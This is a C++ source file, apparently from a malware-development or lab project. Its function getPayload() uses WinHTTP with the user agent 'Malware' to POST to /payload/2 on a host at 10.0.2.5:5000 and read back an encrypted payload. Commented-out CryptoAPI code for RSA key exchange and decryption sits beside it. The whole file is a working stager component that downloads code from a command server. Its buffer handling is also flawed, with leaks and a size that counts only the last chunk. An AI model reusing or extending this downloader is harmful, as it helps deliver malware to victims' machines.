#include "Winhttp-Request.h"

EncryptedData getPayload()
{
    BYTE* pbFinalEncryptedData = nullptr;
    DWORD dwTotalDataLen = 0;
    EncryptedData result = { nullptr, 0 };
    // Create a RSA key pair.
    /*HCRYPTPROV hCryptProv;
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET)) {
        if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_MACHINE_KEYSET | CRYPT_NEWKEYSET)) {
            return { nullptr, 0 };
        }
    }*/

   /* HCRYPTKEY hKey;
    if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, CRYPT_EXPORTABLE, &hKey)) {
        return { nullptr, 0 };
    }*/

    // Export the public key.
    /*BYTE* pbPublicKeyBlob = NULL;
    DWORD dwPublicKeyBlobLength = 0;

    if (!CryptExportKey(hKey, NULL, PUBLICKEYBLOB, 0, NULL, &dwPublicKeyBlobLength)) {
        return { nullptr, 0 };
    }*/

    //pbPublicKeyBlob = new BYTE[dwPublicKeyBlobLength];
    //if (!CryptExportKey(hKey, NULL, PUBLICKEYBLOB, 0, pbPublicKeyBlob, &dwPublicKeyBlobLength)) {
    //    return { nullptr, 0 };
    //}

    //// Display the public key.
    //printf("Public key: ");
    //for (DWORD i = 0; i < dwPublicKeyBlobLength; i++) {
    //    printf("%02x", pbPublicKeyBlob[i]);
    //}
    //printf("\n");

    HINTERNET hSession = WinHttpOpen(L"Malware",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, L"10.0.2.5", 5000, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/payload/2", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    printf("[*] Sending request...\n");
    // Send a request with the public key.
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 0, 0, 0, 0)) {
        printf("Error %u WinHttpSendRequest.\n", GetLastError());
        return { nullptr, 0 };
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("Error %u WinHttpReceiveResponse.\n", GetLastError());
        return { nullptr, 0 };
    }


    DWORD dwEncryptedDataLen = 0;
    LPSTR pbEncryptedData = NULL;
    LPSTR pbEncryptedDataBackup = NULL;
    DWORD dwDownloaded = 0;
    do {
        // Allocate memory to store the encrypted message. 
        dwEncryptedDataLen = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwEncryptedDataLen))
            printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());

        pbEncryptedData = new char[dwEncryptedDataLen + 1];
        pbEncryptedDataBackup = new char[dwEncryptedDataLen + 1];


        if (!pbEncryptedData) {
            printf("Error allocating memory for the buffer.\n");
            dwEncryptedDataLen = 0;
        }
        else {
            // Read the data.
            ZeroMemory(pbEncryptedData, dwEncryptedDataLen + 1);
            if (!WinHttpReadData(hRequest, (LPVOID)pbEncryptedData, dwEncryptedDataLen, &dwDownloaded)) {
                printf("Error %u in WinHttpReadData.\n", GetLastError());
                return { nullptr, 0 };
            }
            else {
                // Store the encrypted data
                //printf("%s", pbEncryptedData);
                pbEncryptedDataBackup = pbEncryptedData;
                dwEncryptedDataLen = 0;
            }

            dwTotalDataLen += dwDownloaded;
        }

        //// Decrypt the message.
        //if (!CryptDecrypt(hKey, NULL, TRUE, 0, pbEncryptedData, &dwEncryptedDataLen)) {
        //    return 1;
        //}

        //// Display the decrypted message.
        //printf("Decrypted message: ");
        //for (DWORD i = 0; i < dwDecryptedDataLen; i++) {
        //    printf("%c", pbDecryptedData[i]);
        //}
        //printf("\n");


        //delete[] pbPublicKeyBlob;

    } while (dwEncryptedDataLen > 0);


    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    //CryptDestroyKey(hKey);
    //CryptReleaseContext(hCryptProv, 0);

    result.data = pbEncryptedData;
    result.size = dwDownloaded;

    //printf("%s", pbEncryptedDataBackup);

    return result;
}